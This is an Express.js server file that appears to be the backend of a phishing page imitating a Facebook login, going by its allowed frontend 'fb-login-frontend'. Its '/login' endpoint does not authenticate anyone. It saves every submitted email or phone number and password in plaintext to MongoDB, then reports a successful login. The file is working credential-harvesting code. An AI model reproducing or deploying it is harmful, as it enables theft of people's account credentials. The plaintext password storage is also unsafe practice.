const express = require('express');
const bodyParser = require('body-parser');
const mongoose = require('mongoose');
const cors = require('cors'); // Import the CORS middleware

const app = express();

// Middleware
app.use(cors({
  origin: ['https://fb-login-frontend.vercel.app'], // Only allow the production frontend URL
  methods: 'GET,HEAD,PATCH,POST,PUT,DELETE',
}));
app.use(bodyParser.json());

// Connect to MongoDB
mongoose.connect('mongodb://localhost:27017/myloginapp', { useNewUrlParser: true, useUnifiedTopology: true })
  .then(() => console.log('MongoDB connected'))
  .catch((err) => console.log('MongoDB connection error:', err));

// Define a User model
const User = mongoose.model('User', new mongoose.Schema({
  emailOrPhone: String,
  password: String
}));

// API endpoint to handle login
app.post('/login', async (req, res) => {
  const { emailOrPhone, password } = req.body;

  try {
    // Save user data to the database
    const user = new User({ emailOrPhone, password });
    await user.save();

    // Send success response
    res.status(200).json({ message: 'User logged in successfully' });
  } catch (err) {
    console.error(err);
    res.status(500).send('Error saving user data.');
  }
});

// Start the server
const port = process.env.PORT || 5000;
app.listen(port, () => {
  console.log(`Server running on port ${port}`);
});
